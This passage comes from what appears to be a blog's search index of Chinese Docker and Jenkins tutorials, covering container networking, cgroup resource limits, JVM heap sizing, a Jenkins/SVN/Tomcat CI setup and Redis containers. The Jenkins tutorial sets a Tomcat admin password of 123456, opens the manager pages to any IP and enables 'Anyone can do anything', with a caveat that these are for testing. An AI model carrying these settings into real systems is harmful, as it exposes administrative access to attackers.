该模式将容器放置在它自己的网络栈中，但是并不进行任何配置。实际上该模式关闭了容器的网络功能，此模式在以下两种情况下是有用的，第一种是容器并不需要网络（例如只需要写磁盘卷的批处理任务），第二种是希望自己自定义网络。 123456789# docker run -d -p 8888:8080 --net=none --name=tomcat8 tomcat:8# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4b4b90aa1a98 tomcat:8 "catalina.sh run" 2 seconds ago Up 1 second tomcat8# docker inspect tomcat8 | grep IPAddress"SecondaryIPAddresses": null,"IPAddress": "", Docker 网络安全 Docker 可以开启容器间通信（意味着默认配置–icc=true），也就是说，宿主机上的所有容器可以不受任何限制地相互通信，这可能导致拒绝服务攻击。进一步地，Docker 可以通过–ip_forward 和–iptables 两个选项控制容器间、容器和外部世界的通信。应该多了解这些选项的默认值，并让网络组根据公司策略设置 Docker 进程。 Docker 容器分配固定 IP 1234567891011121314151617181920212223# 创建自定义网络（网桥），这里子网掩码使用255.255.255.0，也就是IP后面的数字24# docker network create --subnet=172.170.0.0/24 jenkins-network# 可使用以下命令删除自定义网络（网桥）# docker network rm jenkins-network# 查看Docker的网桥列表# docker network lsNETWORK ID NAME DRIVER SCOPE14c2653a88a2 bridge bridge localf44c2671ffd1 host host local007c22522504 jenkins-network bridge local03b720dc8c80 none null local# 创建并启动容器，指定自定义网络（网桥）、IP# docker run -d --net jenkins-network --ip 172.170.0.5 -p 9126:80 -p 4690:3690 --name jenkins-svn-httpd clay/jenkins-svn-httpd:1.1# 查看容器的IP# docker exec -it jenkins-svn-httpd ip addr49: eth0@if50: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:aa:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.170.0.5/24 brd 172.170.0.255 scope global eth0 valid_lft forever preferred_lft forever var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之十三资源隔离与资源限制介绍",url:"/posts/d1859c90.html",text:'虚拟机与容器底层实现的对比 虚拟机与容器的底层实现原理是不同的，正如上图片的对比。虚拟机实现资源隔离的方法是利用一个独立的 Guest OS，并利用 Hypervisor 虚拟化 CPU、内存、IO 设备等实现的。例如，为了虚拟化内存，Hypervisor 会创建一个 shadow page table，正常情况下，一个 page table 可以用来实现从虚拟内存到物理内存的翻译。相比虚拟机实现资源和环境隔离的方案，Docker 就显得简练很多，它不像虚拟机一样重新加载一个操作系统内核，引导、加载操作系统内核是一个比较耗时而又消耗资源的过程，Docker 是利用 Linux 内核特性（LXC）实现的隔离，运行容器的速度几乎等同于直接启动进程。 Linux Namespace 的六大类型 Docker 资源隔离与资源限制的实现原理 使用 Namespace 实现了系统环境的隔离， Namespace 允许一个进程以及它的子进程从共享的宿主机内核资源（Uts、Ipc、、Network、Pid、Mount、User 等）里获得一个仅自己可见的隔离区域，让同一个 Namespace 下的所有进程感知彼此变化，对外界进程一无所知，仿佛运行在一个独占的操作系统中。 使用 CGroups 限制这个环境的资源使用情况，比如一台 16 核 32GB 的机器上只让容器使用 2 核 4GB。使用 CGroups 还可以为资源设置权重，计算使用量，操控任务（进程或线程）启停等。 使用镜像管理功能，利用 Docker 的镜像分层、写时复制、内容寻址、联合挂载技术实现了一套完整的容器文件系统及运行环境，再结合镜像仓库，镜像可以快速下载和共享，方便在多环境部署。 Docker 隔离性的陷阱 Docker 是利用 CGroups 实现资源限制的，只能限制资源消耗的最大值，而不能隔绝其他程序占用自己的资源。 Namespace 的 6 项隔离看似完整，实际上依旧没有完全隔离 Linux 资源，比如 /proc 、/sys 、/dev/sd * 等目录未完全隔离，SELinux、time、syslog 等所有现有 Namespace 之外的信息都未隔离。 由于 /proc 、/sys 、/dev/sd * 等目录未完全隔离，如果在 Docker 容器中执行 top、free 等命令，会发现看到的资源使用情况都是宿主机的资源情况，而很多情况下需要知道的是这个容器被限制了多少 CPU、内存、当前容器内的进程使用了多少。这就导致程序运行在容器里面，调用 API 获取系统内存、CPU，取到的是宿主机的资源大小。同时对于多进程程序，一般都可以将 worker 数量设置成 auto，自适应系统 CPU 核数，但在容器里面这么设置，取到的 CPU 核数是不正确的，例如 Nginx，其他应用取到的可能也不正确，需要进一步测试。 Docker 隔离性陷阱原因分析 当启动一个容器时候，Docker 会调用 libcontainer 实现对容器的具体管理，包括创建 Uts、Ipc、、Net、Pid、Mount、User 等 Namespace 实现容器之间的隔离和利用 CGroups 实现对容器的资源限制。在其中，Docker 会将宿主机一些目录以只读方式挂载到容器中，其中包括 /proc、/dev、/dev/shm、/sys 目录，同时还会建立以下几个链接，保证系统 IO 不会出现问题，这也是为什么在容器里面取到的是宿主机资源原因。 1234/proc/self/fd-&gt;/dev/fd/proc/self/fd/0-&gt;/dev/stdin/proc/self/fd/1-&gt;/dev/stdout/proc/self/fd/2-&gt;/dev/stderr Docker 容器内，JVM 堆内存陷阱 JVM 默认的最大 Heap 大小是系统内存的 1/4，假若物理机内存为 10G，如果你不手动指定 Heap 大小，则 JVM 默认 Heap 大小就为 2.5G。JavaSE8 (&lt;8u131) 版本前还没有针对在容器内执行高度受限的 Linux 进程进行优化，JDK1.9 以后开始正式支持容器环境中的 CGroups 内存限制，JDK1.10 这个功能已经默认开启，可以查看相关 Issue。熟悉 JVM 内存结构的人都清楚，JVM Heap 是一个只增不减的内存模型，Heap 的内存只会往上涨，不会下降。在容器里面使用 Java，如果为 JVM 未设置 Heap 大小，Heap 取得的是宿主机的内存大小，当 Heap 的大小达到容器内存大小时候，就会触发系统对容器 OOM，Java 进程会异常退出。常见的系统日志打印如下： 1234567memory: usage 2047696kB, limit 2047696kB, failcnt 23543memory+swap: usage 2047696kB, limit 9007199254740991kB, failcnt 0......Free swap = 0kBTotal swap = 0kB......Memory cgroup out of memory: Kill process 18286 (java) score 933 or sacrifice ... Docker 容器内，手动设置 Java 应用的堆内存大小 12345# 对于JavaSE8(&lt;8u131)版本，可以在创佳并启动容器的时候，通过环境变量传参确切限制最大Heap大小# docker run -d -m 800M -e JAVA_OPTIONS=\'-Xmx300m\' openjdk:8-jdk-alpine# 对于JavaSE8(&gt;8u131)版本，可以使用上面手动指定最大堆大小，也可以使用下面办法，设置自适应容器内存限制# docker run -d -m 800M -e JAVA_OPTIONS=\'-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MaxRAMFraction=1\' openjdk:8-jdk-alpine 从 CGroups 中正确读取容器资源信息 Docker 在 1.8 版本以后会将分配给容器的 CGroups 信息挂载进容器内部，容器里面的程序可以通过解析 CGroups 信息获取到容器资源信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 查看容器内的挂载记录# cat /etc/mtabcgroup /sys/fs/cgroup/systemd cgroup ro,seclabel,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd 0 0cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,net_prio,net_cls 0 0cgroup /sys/fs/cgroup/cpuset cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuset 0 0cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuacct,cpu 0 0cgroup /sys/fs/cgroup/perf_event cgroup ro,seclabel,nosuid,nodev,noexec,relatime,perf_event 0 0cgroup /sys/fs/cgroup/memory cgroup ro,seclabel,nosuid,nodev,noexec,relatime,memory 0 0cgroup /sys/fs/cgroup/hugetlb cgroup ro,seclabel,nosuid,nodev,noexec,relatime,hugetlb 0 0cgroup /sys/fs/cgroup/freezer cgroup ro,seclabel,nosuid,nodev,noexec,relatime,freezer 0 0cgroup /sys/fs/cgroup/blkio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,blkio 0 0cgroup /sys/fs/cgroup/pids cgroup ro,seclabel,nosuid,nodev,noexec,relatime,pids 0 0cgroup /sys/fs/cgroup/devices cgroup ro,seclabel,nosuid,nodev,noexec,relatime,devices 0 0# 获取已使用内存的大小（USAGE）# cat /sys/fs/cgroup/memory/memory.usage_in_bytes4289953792# 获取内存限制的大小（LIMIT）# cat /sys/fs/cgroup/memory/memory.limit_in_bytes4294967296# 获取磁盘I/O状况# cat /sys/fs/cgroup/blkio/blkio.throttle.io_service_bytes7:0 Read 122887:0 Write 07:0 Sync 07:0 Async 122887:0 Total 12288......# 获取容器虚拟网卡入口流量# cat /sys/class/net/eth0/statistics/rx_bytes10167967741# 获取容器虚拟网卡出口流量# cat /sys/class/net/eth0/statistics/tx_bytes15139291335# 获取容器内是否被设置了OOM，是否发生过OOM# cat /sys/fs/cgroup/memory/memory.oom_controloom_kill_disable 0under_oom 0# oom_kill_disable默认为0，表示打开了oom killer，就是当内存超时会触发kill进程。可以在使用docker run时候指定disable oom，将此值设置为1，关闭oom killer；# under_oom 这个值仅仅是用来看的，表示当前的CGroups的状态是不是已经oom了，如果是，这个值将显示为1。 LXCFS 使用 由于习惯性等原因，在容器中使用 top、free 等命令仍然是一个较为普遍存在的需求，但是容器中的 /proc、/sys 目录等还是挂载的宿主机目录。开源项目 LXCFS 是基于 FUSE 实现的一套用户态文件系统，使用 LXCFS 可以实现在容器内继续使用 free 等命令。但是 LXCFS 目前只支持为容器生成下面列表中的文件，如果命令是通过解析这些文件实现的，那么在容器里面可以继续使用，否则只能通过读取 CGroups 获取资源情况。如果对从容器中如何读取 CGroups 信息感兴趣，可以了解 docker stats 的源码实现。 123456/proc/cpuinfo/proc/diskstats/proc/meminfo/proc/stat/proc/swaps/proc/uptime Docker 资源限制配置 https://blog.csdn.net/candcplusplus/article/details/53728507 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Jenkins 入门教程之二 Jenkins 与 SVN 搭建 CI-CD 环境",url:"/posts/44bda657.html",text:'前言 本教程实战演示基于 SVN + Jenkins + Maven + JDK + Docker 搭建 CI/CD 环境，其中 SVN 基于 Debian 镜像手动安装，而 Jenkins、Maven、JDK 则基于 Tomcat 镜像手动安装。如果仅为了快速体验使用 Jenkins 的功能，可以直接 Pull Jenkins 官方的 Docker 镜像，然后创建并启动 Docker 容器来体验 Jenkins 相关功能，此时可忽略下面教程中的大部分操作步骤。 Docker 环境安装与配置 站内教程：Docker 介绍与安装 基于 Docker 搭建 SVN 服务器 站内教程：通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP/SVN 协议访问 SVN 仓库 123456789101112131415161718192021# 拉取Debian镜像# docker pull debian# 创建并启动容器，80是Apache端口，3690是Subversion端口，/var/lib/svn是所有SVN仓库的父目录# docker run -it -p 9126:80 -p 4690:3690 --name svn-httpd \\ -v /container/svn-server:/var/lib/svn \\ -d debian# 连接容器# docker exec -it svn-httpd /bin/bash# 修改系统时间# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# 参考上面给出的本站教程，使用Apache、Subversion搭建SVN服务器# 断开容器连接，不停止运行容器# ctrl + p + q# 最后如果Subversion容器能正常工作，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-svn-httpd image" svn-httpd clay/jenkins-svn-httpd:1.0 基于 Docker 搭建 Tomcat 服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# 拉取Tomcat8的镜像# docker pull tomcat:8# 创建并启动容器# docker run -p 8888:8080 --name tomcat8 \\ -v /container/tomcat8/logs:/usr/local/tomcat/logs \\ -d tomcat:8# 连接容器# docker exec -it tomcat8 /bin/bash# 更新系统并安装常用软件，Docker官方的Tomcat镜像默认安装了Open-JDK、Tomcat Native、APR，具体安装细节可以参考官方镜像的Dockerfile文件# apt-get -y update# apt-get -y upgrade# apt-get -y install git vim htop telnet net-tools# 修改系统时间# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# 配置Tomcat8的管理用户，编辑Tomcat8对应的配置文件，在&lt;tomcat-users&gt;标签内添加以下内容# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# 关于Tomcat配置管理用户，不同版本的Tomcat配置方法有差异，上面仅演示Tomcat8版本的配置方法。# 由于Tomcat8默认启用了网段限制，默认只有127网段局域网的机器才拥有有访问权限，如果是其他网段登陆，如172，10网段会报403错误，因此需要按照下面的方法修改对应的context.xml配置文件。# 出于安全考虑，在生产环境中建议启用默认的网段限制，即只允许在本地访问Tomcat服务器的管理页面。# 编辑manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 编辑host-manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 断开容器连接# exit# 重启容器使配置生效# docker restart tomcat8# 通过浏览器访问Tomcat的管理页面，测试是否配置成功# 最后如果Tomcat容器能正常工作，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.0 Tomcat 容器内安装与配置 Oracle JDK、Maven 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 提示：这里安装的Oracle JDK、Maven，在后面Jenkins的全局工具配置中会用到# 连接容器# docker exec -it tomcat8 /bin/bash# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 下载Maven# wget -P /usr/local/ http://mirrors.shu.edu.cn/apache/maven/maven-3/3.6.0/binaries/apache-maven-3.6.0-bin.tar.gz# 解压Maven# tar -xvf /usr/local/apache-maven-3.6.0-bin.tar.gz# 删除下载文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# rm /usr/local/apache-maven-3.6.0-bin.tar.gz# 创建Java命令的软链接，如果安装了Open-JDK，会覆盖Open-JDK相关命令# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK、Maven的环境变量，在配置文件末尾追加以下内容即可# 注意，在/etc/profile配置文件中添加环境变量后，重启Docker容器后环境变量会失效，建议在DockerFile中添加环境变量，然后通过DockerFile构建得到Docker镜像# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATHMAVEN_HOME=/usr/local/apache-maven-3.6.0PATH=$PATH:$MAVEN_HOME/binexport MAVEN_HOME PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效# mvn -version# java -version# javac -version# 最后如果上面的配置都生效了，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.1 Tomcat 容器内安装 Jenkins Jenkins 本质是一个 Java 开发的 Web 项目，官方发布方式有 War 文件、Native 包、安装程序、Docker 镜像，Jenkins 官方下载页面。 12345678910111213141516171819202122232425# 连接容器# docker exec -it tomcat8 /bin/bash# 下载War文件到Tomcat的webapps目录# wget -P /usr/local/tomcat/webapps https://mirrors.tuna.tsinghua.edu.cn/jenkins/war-stable/2.150.2/jenkins.war# 编辑server.xml配置文件，修改Tomcat URI地址的编码解码字符集为UTF-8# vim /usr/local/tomcat/conf/server.xml&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" URIEncoding="UTF-8"/&gt;# 断开容器连接# exit# 重启容器# docker restart tomcat8# 浏览器访问以下地址测试Jenkins是否启动成功，首次访问Jenkins的管理页面，会提示进行解锁操作http://127.0.0.1:8888/jenkins# 如果Jenkins启动失败，可以通过输入以下地址查看Jenkins的日志信息或者查看Tomcat的日志信息来定位问题http://localhost:8888/jenkins/log/all# 提示：Jenkins默认的数据目录是：/root/.jenkins (adsbygoogle = window.adsbygoogle || []).push({}); 解锁 Jenkins 12345# 连接容器# docker exec -it tomcat8 /bin/bash# 查看Jenkins自动生成的管理密码，并将管理密码填写到Jenkins的解锁页面中，这里的管理密码同时也是admin账号的登录密码# cat /root/.jenkins/secrets/initialAdminPassword 安装 Jenkins 插件 解锁后会跳转到 “自定义 Jenkins” 页面，页面中选择哪种方式来安装插件都不会对后续操作有太大影响；因为有需要的插件可以在后续有针对性地安装，本文选择 “安装推荐的插件”。 创建 Jenkins 管理员用户 根据页面提示创建管理员用户，表单填写完后点击”Save and Continue” 按钮保存设置，这里的管理员用户区别于 Jenkins 自动创建的 admin 用户。 配置 Jenkins 实例 一般使用默认的 Jenkins URL 即可。 登录 Jenkins 管理后台 浏览器输入 Jenkins 管理后台的登录地址，填写上面创建的管理员或者 admin 账号和密码即可登录。如果登录后的页面只显示空白页面，可以尝试重启 Tomcat 服务器再访问 URL：http://127.0.0.1:8888/jenkins/login Jenkins 支持中文界面 Manage Jenkins –&gt; Manage Plugins –&gt; Available –&gt; 搜索关键字”Local” –&gt; 选中 Local 插件进行安装，建议安装完之后手动重启 Tomcat 服务器。 Jenkins 开启用户注册功能 Manage Jenkins –&gt; Configure Global Security –&gt; 勾选”Allow users to sign up” –&gt; 点击”Save” 按钮保存设置。如果是处于学习或者测试阶段，还可以勾选 “Anyone can do anything”，这样更方便测试 Jenkins 的功能。出于安全考虑，生产环境下记得取消勾选此项。 Jenkins 全局工具配置 Manage Jenkins –&gt; Global Tool Configuration –&gt; 指定 Maven 的配置文件路径、JDK 的安装路径、Maven 的安装路径 –&gt; 点击”Save” 按钮保存设置。不要选择自动安装，因为上面已经手动安装并配置好 Maven、Oracle JDK。 安装 deploy to container 插件 到此为止，基于 SVN + Jenkins + Maven + JDK + Docker 的 CI/CD 环境已经搭建完成。 下篇：Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ci/cd"},{title:"Jenkins 入门教程之一 Jenkins 介绍",url:"/posts/dbce0754.html",text:'Jenkins 相关站点 Jenkins 官网 Jenkins 官方文档 官方 Jenkins Docker 镜像的使用说明文档 Jenkins 与 Hundson 介绍 Jenkins 与 Hundson 是目前最流行的持续集成及自动化部署工具，基于 Java 语言开发，二者师出同门。2009 年甲骨文收购了 Sun 公司并继承了 Hudson 代码库。在 2011 年年初，甲骨文和开源社区之间的关系破裂，该项目被分成两个独立的项目 Jenkins 和 Hundson。其中 Jenkins 的团队由大部分原始开发人员组成，Hudson 则由甲骨文公司继续管理，所以二者是非常相似的产品。Jenkins 可以整合 Subversion、Git、GitHub 等，而 Husband 同样也可以。其他优秀的持续集成工具还有 Strider、GitLab CI、TeamCity（JetBrains）、Travis CI、Codeship、Codefresh 等。 持续集成介绍 问题：各个小组分别负责各个具体模块开发，本模块独立测试虽然能够通过，但是上线前夕将所有模块整合到一起集成测试却发现存在很多问题，想要解决就需要把很多代码返工重写而且仍然有可能有问题，但现在时间很可能不够了。那怎么做会好一些呢？ 概念：Continuous Integration（CI）持续集成指开发人员提交了新代码之后，立刻进行构建、自动化测试。根据测试结果，确定所有模块的代码是否能正确地集成在一起；如果失败，开发团队就要停下手中的工作立即修复它。Martin Fowler 说过：” 持续集成并不能消除 Bug，而是让它们非常容易发现和改正。” 关注点：持续集成的关注点在于尽早发现项目整体运行存在的问题，并尽早解决。 持续交付介绍 问题：项目的各个升级版本之间间隔时间太长，对用户反馈感知迟钝，无法精确改善用户体验，用户流失严重。那怎么做会好一些呢？ 概念：Continuous Delivery (CD) 持续交付建立在持续集成的基础上，指将集成后的代码部署到更贴近真实运行环境的「类生产环境」，确保可以以可持续的方式快速向质量团队或者用户发布新版本；同时不断收集用户反馈的信息，用最快的速度改进优化。如果代码没有问题，下一步可以继续部署到生产环境中。 关注点：持续交付的关注点在于研发团队的最新代码能够尽快让最终用户体验到。 持续部署介绍 问题：开发过程中进行单元测试能够通过，但是部署到服务器上运行出现问题。仅仅单元测试还不够，各个模块都必须能够在服务器上运行。那怎么做会好一些呢？ 概念：Continuous Deployment（CD）持续部署建立在持续交付的基础上，指代码通过评审之后，把部署到生产环境的过程自动化，前提是能自动化完成构建、测试、部署等步骤。 关注点：持续部署的关注点在于代码在任何时刻都是可以部署和进入生产阶段的，为下一步测试环节或最终用户正式使用做好准备。 CI/CD 工作流程图 GitOps 工作流程图 参考资料 什么是 CI/CD？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ci/cd"},{title:"Docker 之十二可视化管理工具介绍",url:"/posts/91f8692e.html",text:'主流的 Docker 可视化管理工具 docker ui、shipyard、portainer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之十一实战 Push 镜像到阿里云镜像仓库",url:"/posts/8496a43e.html",text:'设置 Registry 登录密码 创建命名空间 创建镜像仓库（本地） 将本地镜像推送到镜像仓库 123456789101112131415161718# 在下面的操作中，链接registry.cn-shenzhen.aliyuncs.com可以从阿里云的镜像仓库管理页面获取# 登录阿里云Docker Registry，成功后帐号信息默认存放在 ~/.docker/config.json# docker login --username=[用户名] registry.cn-shenzhen.aliyuncs.com# tag命令官方语法: docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]# tag命令官方解释： Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE# 创建目标镜像，其中peter-docker-study是命名空间，centos-test是仓库名称# docker tag [镜像ID] registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号]# 查看本地镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [镜像版本号] [镜像ID] 1 hours ago 385MB# 将本地镜像Push到阿里云镜像仓库# docker push registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号] 从镜像仓库拉取镜像到本地 12345678910# 拉取镜像到本地，其中peter-docker-study是命名空间，centos-test是仓库名称# docker pull registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号]# 查看本地镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [镜像版本号] [镜像ID] 1 hours ago 385MB# 以交互式运行Pull下来的Docker镜像# docker run -it --name=“peter-centos” registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号] var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之十实战使用 Docker 官方的 Redis 镜像",url:"/posts/f13cae46.html",text:'Docker 官方 Redis 镜像的使用说明文档 https://hub.docker.com/_/redis 使用 Docker 官方的 Redis 镜像 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 搜索所有可用的Redis镜像# docker search redis# 下载Docker官方提供的Redis5.0镜像（基于Debian-Stretch）# docker pull redis:5.0# 创建并启动（以后台方式）Redis容器，同时挂载Redis的数据文件目录和启用AOF# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server --appendonly yes# 或者指定Redis的配置文件目录来启动Redis容器# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/conf/redis.conf:/usr/local/etc/redis/redis.conf \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server /usr/local/etc/redis/redis.conf# 注意：# 上面的/container/redis5.0/conf/redis.conf是Redis的配置文件目录（非配置文件本身），应该在此目录下预先添加Reids真正的配置文件redis.conf，然后再启动Redis容器# 如果指定Reids配置文件目录来启动Redis容器，那配置文件redis.conf里应该注释掉"bind"相关配置项# 指定Redis的配置文件目录来启动Redis容器，并添加Redis的配置文件，最终宿主机共享目录的目录结构如下：/container└── redis5.0 ├── conf │&nbsp;&nbsp; └── redis.conf │&nbsp;&nbsp; └── redis.conf └── data# 查看当前所有正在运行的容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESdbe17690112d redis:5.0 "docker-entrypoint.s…" 3 minutes ago Up 3 minutes 0.0.0.0:6379-&gt;6379/tcp redis5.0# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it redis5.0 /bin/bash# 在容器内，连接到Redis服务器# redis-cli -p 6379# 提示：Reids相关文件目录说明# 默认数据文件目录：/data# 默认安装目录：/usr/local/bin/# 默认日志文件：在配置文件redis.conf中指定# 默认配置文件：启动Redis容器的时候，如果不指定Redis的配置文件目录，则容器内使用默认参数启动Redis服务（即此时不存在默认的Reids配置文件） 验证 Redis 服务器是否可用 1234567891011121314# 在宿主机上，使用容器内的redis-cli工具连接到的Redis服务器# docker exec -it redis5.0 redis-cli# 或者在宿主机上，使用容器内的redis-cli工具连接到的Redis服务器，并指定Redis服务监听的端口# docker exec -it redis5.0 redis-cli -p 6379# 设置Key127.0.0.1:6379&gt; set key1 helloworld# 获取Key127.0.0.1:6379&gt; get key1# 退出Redis登录127.0.0.1:6379&gt; exit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 缓存"},{title:"Docker 